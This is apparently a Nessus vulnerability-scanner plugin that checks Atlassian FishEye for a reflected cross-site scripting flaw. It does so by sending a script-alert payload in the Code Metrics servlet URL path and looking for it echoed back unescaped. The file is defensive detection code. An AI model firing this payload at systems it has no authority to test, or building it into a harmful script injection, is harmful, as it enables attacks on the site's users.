#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(50450);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2017/05/16 19:35:39 $");

  script_bugtraq_id(44264);
  script_osvdb_id(68729);

  script_name(english:"Atlassian FishEye Code Metrics Report Plugin XSS");
  script_summary(english:"Attempts a non-persistent XSS");

  script_set_attribute(attribute:"synopsis", value:"The remote web server has a cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Atlassian FishEye running on the remote host has a
cross-site scripting vulnerability. The Code Metrics Report Plugin
does not properly sanitize user input.

A remote attacker could exploit this by tricking a user into making a
maliciously crafted request, resulting in the execution of arbitrary
script code.

This version of FishEye may have an additional cross-site scripting
vulnerability, though Nessus did not check for that issue.");
  script_set_attribute(attribute:"see_also", value:"https://jira.atlassian.com/browse/CRUC-4572");
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?607f1207"
  );
  script_set_attribute(attribute:"solution", value:"Upgrade to FishEye 2.3.7 / 2.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/10/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/10/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:atlassian:fisheye");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("fisheye_detect.nasl");
  script_require_ports("Services/www", 8060);
  script_require_keys("installed_sw/fisheye");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:8060);
app = 'FishEye';
app_name = tolower(app);

get_install_count(app_name:app_name, exit_if_zero:TRUE);

install = get_single_install(
  app_name : app_name,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);

# First, get a valid repo
url = dir + '/browse';
res = http_send_recv3(method:'GET', item:url, port:port, exit_on_fail:TRUE);
match = eregmatch(string:res[2], pattern:'href="' + dir + '/browse/([^"]+)"');
if (!match)
  exit(1, 'Unable to get a repository name from the '+app+' install at ' + install_url + '.');
else
  repo = match[1];

# Then attempt the XSS.
#
# nb: test_cgi_xss() can't be used for this test since it
#     assumes a query string will be provided.
xss = "<script>alert('" + SCRIPT_NAME + '-' + unixtime() + "')</script>";
url = dir + '/plugins/servlet/code-metrics/' + repo + '/;' + xss;
res = http_send_recv3(method:'GET', item:url, port:port, exit_on_fail:TRUE);

if (xss + '</code>' >< res[2])
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
